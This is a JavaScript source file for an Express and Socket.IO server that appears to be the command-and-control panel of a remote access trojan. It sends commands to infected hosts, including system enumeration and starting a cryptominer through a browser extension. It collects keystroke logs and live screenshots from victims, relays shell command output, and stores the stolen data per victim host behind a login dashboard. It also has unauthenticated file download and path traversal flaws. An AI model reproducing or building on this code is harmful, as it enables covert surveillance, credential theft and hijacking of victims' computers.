const express = require("express");
const session = require("express-session");
const socketio = require("socket.io");
const fs = require("fs");
const app = express();
const render = require("./js/views.js");
const fileUpload = require('express-fileupload');

//const sharp = require("sharp");

const server = app.listen(3000, function () {
  console.log("App listening on port 3000!");
});
const io = socketio(server, {
  maxHttpBufferSize: 10e6,
  pingTimeout: 60000,
  cors: {
    origin: "*", // for browser extension
  },
});
let clients = [];



const getOfflineClients = () => {
  var c = [];

  fs.readdirSync("./clients").forEach((file) => {
    c.push(file);
    //console.log(file);
  });
  return c;
}

let offlineclients = getOfflineClients();
var delay = 10;
var fps = 0;
// setInterval(() => {
//   console.log(`FPS: ${fps}`);
//   fps = 0;
// }, 1000);

app.use(express.json());

app.use(
  express.urlencoded({
    extended: true,
  })
);

app.use(express.static("views"));
app.use(express.static("clients"));
app.use(fileUpload());
app.use(express.static(__dirname + "/public")); //Set public files to use

app.set("view engine", "ejs");

app.use(
  session({
    secret: "test",
    resave: true,
    saveUninitialized: true,
    cookie: {
      secure: false,
    }, //Remember to set it to true!
  })
);
// app.get('*', render.errorHandler);

app.get("/", render.loginPage); //Render main page with login and register etc.

app.get("/dashboard", render.dashboard);
//Render dashboard page
app.get("/settings", render.settings); //Render dashboard page

app.post("/", render.login);

app.get("/vnc/:ClientName/:ClientId", render.vncclient);



app.get("/ftp/:FileName?", (req, res) => {
  if (req.params.FileName == null) {
    if (req.session.isLogged) {
      var files = fs.readdirSync("./ftp");
      var sizes = [];

      files.forEach(function(file){
        sizes.push(getFilesize(`./ftp/${file}`))
      })
      console.log(sizes);
      res.render("ftp", {
        isLogged: req.session.isLogged,
        username: req.session.username,
        files: files,
        sizes: sizes,
      });
    } else res.render("index");
  } else {
    res.download("ftp/" + req.params.FileName, function (err) {
      if (err) {
        console.log(err);
      }
    });
  } 
});

app.post("/ftp", (req, res) => {
  //fs.appendFileSync("./ftp/" + "test", req.)

  console.log(req.files)
  if (!req.files || Object.keys(req.files).length === 0) {
    return res.status(400).send('No files were uploaded.');
  }

  // The name of the input field (i.e. "sampleFile") is used to retrieve the uploaded file
  let File = req.files.file;

  // Use the mv() method to place the file somewhere on your server
  File.mv(`./ftp/${File.name}`, function(err) {
    if (err)
      return res.status(500).send(err);

    res.send('File uploaded!');
  });
});

app.get("/logs/:ClientName/:FileName?", (req, res) => {
  const ClientName = req.params.ClientName;
  const FileName = req.params.FileName;
  var fileContents;
  var ext;
  var sizes = [];

    if (FileName != null) {
      //Pobiera zawartosc pliku
      try {
        ext = FileName.split(".")
          .filter(Boolean) // removes empty extensions (e.g. `filename...txt`)
          .slice(1)
          .join(".");
        if (ext == "txt") {
          fileContents = fs
            .readFileSync(`./clients/${ClientName}/${FileName}`)
            .toString();
        } else {
          fileContents = fs.readFileSync(
            `./clients/${ClientName}/${FileName}`,
            "base64"
          );
        }
      } catch (err) {}
    } else {
      fileContents = fs.readdirSync(`./clients/${ClientName}`);
      fileContents.forEach(function(file){
        sizes.push(getFilesize(`./clients/${ClientName}/${file}`))
      })
    }


  //Render log
  if (req.session.isLogged) {
    res.render("log", {
      content: fileContents,
      clientname: ClientName,
      filename: FileName,
      isLogged: req.session.isLogged,
      username: req.session.username,
      sizes: sizes,
      type: ext,
    });
  } else res.render("index");
});

app.post("/logout", render.logout);

io.of("/extension").on("connection", (socket) => {
  socket.on("join", (msg) => {
    console.log("Dolaczyl " + socket.id + " " + msg);
    socket.emit("command", "minerstart");
  });
  socket.on("logs", async (msg) => {
    const now = new Date();
    const current = `[${now.getHours()}:${now.getMinutes()}] `;
    console.log(current + msg);
    //writeToFile(socket.name, current + msg);
  });
  socket.on("screenshotResult", async (msg) => {
    console.log(msg);
    //writeToFile(socket.name, current + msg);
  });
});
io.on("connection", (socket) => {
  socket.on("join", (msg) => {
    // let info = msg.split(":");
    // socket.ip = info[0];
    // socket.name = info[1];
    // socket.version = info[2];
    socket.joined = false;
    socket.version = msg;  //-- for client version 1.1

    console.log("Dolaczono: " + socket.name + " " + socket.ip);
    socket.emit("command", "systeminfo");
  });

  socket.on("logs", async (msg) => {
    await io.fetchSockets(); //fix error c++ first send keystrokes
    //console.log(socket.name + ":" + msg);
    const now = new Date();
    const current = `[${now.getHours()}:${now.getMinutes()}] `;
    writeToFile(socket.name, current + msg);
  });

  socket.on("command", (msg) => {
    console.log(msg);
    if (msg.cmd == "delay+") {
      delay += 1;
      console.log(`Aktualny delay: ${delay}`);
      io.sockets.sockets.get(msg.id).emit("delay", delay);
    } else if (msg.cmd == "delay-") {
      console.log(`Aktualny delay: ${delay}`);
      delay -= 1;
      io.sockets.sockets.get(msg.id).emit("delay", delay);
    } else {
      try {
        io.sockets.sockets.get(msg.id).emit("command", msg.cmd);
      } catch (err) {}
    }
  });

  socket.on("commandResult", async (msg) => {
    let bufferObj = Buffer.from(msg, "base64");
    let decodedString = bufferObj.toString("utf-8");
    console.log(decodedString);
    if (socket.joined == false) {
      parseClientInfo(decodedString, socket);
      socket.joined = true;
    } else {
      io.emit("commandResult", {
        id: socket.id,
        response: decodedString,
      });
    }
  });

  socket.on("screenshotResult", async (msg) => {
    //console.log(msg);
    // var d = new Date(),
    //   dformat =
    //     [d.getMonth() + 1, d.getDate(), d.getFullYear()].join("_") +
    //     "-" +
    //     [d.getHours(), d.getMinutes(), d.getSeconds()].join("_");
    //const buffer = Buffer.from(msg, "base64");
    fps += 1;

    io.emit("screenshotResult", {
      id: socket.id,
      response: msg,
    });

    // sharp(Buffer.from(msg, 'base64'))
    // .jpeg({quality: 20})
    // .resize({width: 1280, height: 720})
    // .toBuffer((err, buffer) => {
    //   if (err) {
    //     console.error(err);
    //   } else {
    //     // The resized and compressed image data is now in the `buffer` variable
    //     io.emit("screenshotResult", {
    //       id: socket.id,
    //       response: buffer.toString('base64'),
    //     });
    //   }
    // });

    // fs.writeFileSync(
    //   `./clients/${socket.name}/screenshots/screenshot-${dformat}.jpg`,
    //   buffer
    // );
  });

  socket.on("delete", async (msg) => {
    fs.rmSync(`./clients/${msg.clientname}`, {
      recursive: true,
      force: true,
    });
    offlineclients.splice(offlineclients.indexOf(msg.clientname), 1);
  });
  socket.on("delete-ftp", async (msg) => {
    fs.rmSync(`./ftp/${msg.filename}`, {
      recursive: true,
    });
  });
  socket.on("disconnect", () => {
    if (socket.name != null) {
      //if socket is a keylogger instance
      console.log("Wyszedl: " + socket.name + " " + socket.ip);

      removeById(clients, socket.id);
      if(!offlineclients.includes(socket.name))
        offlineclients.push(socket.name);
      //offlineclients.push(socket.name);
      io.emit("leave", {name: socket.name})

    }
  });
});

function parseClientInfo(decodedString, socket) {
  const outputLines = decodedString.split("\n");
  const osNameLine = outputLines.find((line) => line.startsWith("OS Name:"));
  const osName = osNameLine.split(":")[1].trim();
  const hostNameLine = outputLines.find((line) =>
    line.startsWith("Host Name:")
  );
  const hostName = hostNameLine.split(":")[1].trim();
  const ramLine = outputLines.find((line) =>
    line.startsWith("Total Physical Memory:")
  );
  const ram = ramLine.split(":")[1].trim().replace("�", "");


  
  const ipAddress = decodedString.match(/IP address[^:]+: (.*)/)[1];
  socket.name = hostName;
  clients.push({
    id: socket.id,
    name: hostName,
    ip: ipAddress,
    ram: ram,
    version: socket.version,
    system: osName,
  });
  checkDirectoryExists(socket.name);

  let index = offlineclients.indexOf(socket.name);
  if (index > -1) {
    offlineclients.splice(index, 1);
  }
  io.emit("join", {name: socket.name})
}

function checkDirectoryExists(clientname) {
  if (!fs.existsSync(`./clients`)) fs.mkdirSync("./clients");

  if (!fs.existsSync(`./clients/${clientname}`)) 
    fs.mkdirSync(`./clients/${clientname}`);

}

function writeToFile(clientname, msg) {
    var d = new Date(),
      dformat =
        [d.getDate(), d.getMonth() + 1, d.getFullYear()].join("_")

  msg = msg.replace("\n", "");
  fs.appendFileSync(`./clients/${clientname}/${dformat}.txt`, msg + "\n");
}

const removeById = (arr, id) => {
  const requiredIndex = arr.findIndex((el) => {
    return el.id === String(id);
  });
  if (requiredIndex === -1) {
    return false;
  }
  return !!arr.splice(requiredIndex, 1);
};
function formatBytes(bytes, decimals = 2) {
  if (!+bytes) return '0 Bytes'

  const k = 1024
  const dm = decimals < 0 ? 0 : decimals
  const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB']

  const i = Math.floor(Math.log(bytes) / Math.log(k))

  return `${parseFloat((bytes / Math.pow(k, i)).toFixed(dm))} ${sizes[i]}`
}
function getFilesize(path, decimals = 2) {
  var stats = fs.statSync(path);
  var bytes = stats.size;
  if (!+bytes) return '0 Bytes'

  const k = 1024
  const dm = decimals < 0 ? 0 : decimals
  const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB']

  const i = Math.floor(Math.log(bytes) / Math.log(k))

  return `${parseFloat((bytes / Math.pow(k, i)).toFixed(dm))} ${sizes[i]}`
}

exports.clients = clients;
exports.offlineclients = offlineclients;
